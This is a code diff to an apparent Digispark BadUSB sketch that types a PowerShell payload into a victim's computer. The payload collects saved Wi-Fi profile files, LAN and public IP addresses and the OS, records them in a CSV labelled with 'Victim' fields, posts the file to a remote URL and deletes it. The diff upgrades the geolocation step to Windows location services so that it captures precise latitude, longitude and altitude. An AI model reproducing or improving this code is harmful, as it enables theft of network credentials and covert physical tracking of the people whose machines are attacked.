@@ -30,7 +30,7 @@ void loop() {
       "$defaultRoute=Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue|Sort-Object RouteMetric|Select-Object -First 1;"
       "if($defaultRoute){$ifIndex=$defaultRoute.InterfaceIndex;$lanObj=Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex $ifIndex -ErrorAction SilentlyContinue|Where-Object{ $_.IPAddress -notlike '169.254*' -and $_.IPAddress -notlike '127.0.0.1'}|Select-Object -First 1}else{$lanObj=$null};"
       "if($lanObj){$lan=$lanObj.IPAddress}else{$lan='(unknown)'};"
-      "try{$geo=Invoke-WebRequest -UseBasicParsing \"http://ip-api.com/json/$pub?fields=status,lat,lon\";$g=$geo.Content|ConvertFrom-Json;if($g.status -eq 'success'){$lat=[string]$g.lat;$lon=[string]$g.lon}else{$lat='N/A';$lon='N/A'}}catch{$lat='N/A';$lon='N/A'};"
+      "try{Add-Type -AssemblyName System.Device;$GeoWatcher=New-Object System.Device.Location.GeoCoordinateWatcher;$GeoWatcher.Start();while(($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')){Start-Sleep -Milliseconds 100};if($GeoWatcher.Permission -ne 'Denied'){$loc=$GeoWatcher.Position.Location;if(-not $loc.IsUnknown){$alt=[string]$loc.Altitude;$lat=[string]$loc.Latitude;$lon=[string]$loc.Longitude}else{$alt='N/A';$lat='N/A';$lon='N/A'}}else{$alt='N/A';$lat='N/A';$lon='N/A'};$GeoWatcher.Stop()}catch{$alt='N/A';$lat='N/A';$lon='N/A'};"
       "$ts=(Get-Date -f 'yyyy-MM-dd HH:mm:ss');"
       "$items=@();"
       "Get-ChildItem \"$t\\Wi-Fi-*.xml\"|ForEach-Object{"
@@ -45,7 +45,7 @@ void loop() {
           "VictimLANIP=$lan;"
           "VictimOS=$os;"
           "PublicIP=$pub;"
-          "LANExtra='';"
+          "LANExtra=$alt;"
           "Latitude=$lat;"
           "Longitude=$lon;"
           "PacketSummary=''"
@@ -61,7 +61,7 @@ void loop() {
           "VictimLANIP=$lan;"
           "VictimOS=$os;"
           "PublicIP=$pub;"
-          "LANExtra='';"
+          "LANExtra=$alt;"
           "Latitude=$lat;"
           "Longitude=$lon;"
           "PacketSummary=''"
@@ -71,7 +71,7 @@ void loop() {
       "$items|Export-Csv $csv -NoTypeInformation;"
       "Invoke-WebRequest -UseBasicParsing -Uri $u -Method Post -Body (Get-Content $csv -Raw);"
       "Remove-Item $csv -ErrorAction SilentlyContinue;"
-      "exit"
+      "exit;"
     )
   );
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
